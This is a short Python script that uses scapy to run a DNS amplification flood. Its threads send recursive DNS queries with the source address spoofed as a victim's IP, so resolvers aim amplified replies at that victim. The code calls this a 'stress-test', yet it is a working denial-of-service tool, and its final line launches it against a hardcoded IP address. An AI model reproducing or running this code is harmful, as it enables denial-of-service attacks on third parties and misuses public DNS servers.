from scapy.all import *
import time
import random
import threading
import argparse
from dns_server_check import read_servers

packets = 0

class FloodThread(threading.Thread):
    
    def __init__(self, thread_ID, name, dns_server, target):
        threading.Thread.__init__(self)
        self.thread_ID = thread_ID
        self.name = name
        self.dns_server = dns_server
        self.target = target
        self.flag = True

    def run(self):
        print('Starting ' + self.name + ' (' + str(self.dns_server[1]) + ')')
        while self.flag:
            self.dns_query()
        print('Exiting ' + self.name)

    def dns_query(self):
        source_port = random.randint(1025, 65534)
        ip = IP(src=self.target, dst=self.dns_server[1]) / UDP(sport=source_port, dport=53)
        dns_request = DNS(rd=1, qd=DNSQR(qname=self.dns_server[2], qtype=self.dns_server[3]))
        p = ip / dns_request
        send(p, inter=0, verbose=0)
        global packets
        packets += 1 
        # print(packets)

def main(dns_servers, target, timeout=10, threads=20):
    print('Beginning of stress-test using DNS-amplification attack')
    print('Duration: ', timeout, ' с')
    flood_threads = []
    for i in range(threads):
        flood_threads.append(FloodThread(i, "Thread-" + str(i + 1), dns_servers[i % len(dns_servers)], target))
        flood_threads[i].start()
    timer = time.time() + timeout
    while True:
        if time.time() > timer:
            for i in range(len(flood_threads)):
                flood_threads[i].flag = False
                flood_threads[i].join()
            break
    return packets

main(read_servers()[0], '188.214.128.77')